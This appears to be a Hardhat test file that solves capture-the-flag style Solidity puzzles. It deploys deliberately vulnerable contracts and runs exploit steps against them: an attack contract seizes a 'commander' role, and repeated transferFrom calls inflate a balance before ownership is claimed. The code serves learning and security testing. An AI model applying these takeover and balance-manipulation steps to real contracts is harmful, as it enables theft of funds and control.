import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { expect } from "chai";
import { Contract, constants } from "ethers";
import { ethers } from "hardhat";

describe("Puzzles for OZ", () => {
  // The deployer contract
  let HigherOrder: Contract;
  let HigherOrderAttack: Contract;
  let ERC20: Contract;

  // The signers of the test
  let deployer: SignerWithAddress;
  let exploiter: SignerWithAddress;

  before(async () => {
    [deployer, exploiter] = await ethers.getSigners();

    // Deploy the HigherOrder Puzzle
    let OrderFactory = await ethers.getContractFactory("HigherOrder", deployer);
    HigherOrder = await OrderFactory.deploy();

    // Deploy the HigherOrderAttack
    let OrderAttackFactory = await ethers.getContractFactory(
      "HigherOrderAttack",
      deployer,
    );
    HigherOrderAttack = await OrderAttackFactory.deploy();

    // Deploy the ERC20 Puzzle
    let ERCFactory = await ethers.getContractFactory("ERC20", deployer);
    ERC20 = await ERCFactory.deploy("ERC20", "ERC20");
  });

  it("Should solve the Higher Order Puzzle", async () => {
    let owner = await HigherOrder.commander();
    console.log("Current Commander: ", owner);
    expect(owner).to.be.eq(deployer.address);

    let tx = await HigherOrderAttack.connect(exploiter).attack(
      HigherOrder.address,
    );
    await tx.wait();

    owner = await HigherOrder.commander();
    console.log("Current Commander: ", owner);
    expect(owner).to.be.eq(exploiter.address);
  });

  it("should solve the ERC20 puzzzle", async () => {
    let ownership = await ERC20.owner();
    console.log("Current Owner: ", ownership);

    const totalSupplyBefore = await ERC20.balanceOf(exploiter.address);
    console.log("Total supply before: ", totalSupplyBefore.toString());

    let tx = await ERC20.connect(exploiter).publicMint();
    await tx.wait();

    let totalSupplyAfter = await ERC20.balanceOf(exploiter.address);
    console.log(
      "Total supply after public mint: ",
      totalSupplyAfter.toString(),
    );

    tx = await ERC20.connect(exploiter).transferFrom(
      exploiter.address,
      constants.AddressZero,
      ethers.utils.parseEther("0.5"),
    );
    await tx.wait();

    totalSupplyAfter = await ERC20.balanceOf(exploiter.address);
    console.log(
      "Total supply after transferFrom: ",
      totalSupplyAfter.toString(),
    );

    tx = await ERC20.connect(exploiter).transferFrom(
      exploiter.address,
      exploiter.address,
      ethers.utils.parseEther("0.5"),
    );
    await tx.wait();

    totalSupplyAfter = await ERC20.balanceOf(exploiter.address);
    console.log(
      "Total supply after transferFrom: ",
      totalSupplyAfter.toString(),
    );

    tx = await ERC20.connect(exploiter).claimOwnership();
    await tx.wait();

    ownership = await ERC20.owner();
    console.log("Current Owner: ", ownership);
  });
});
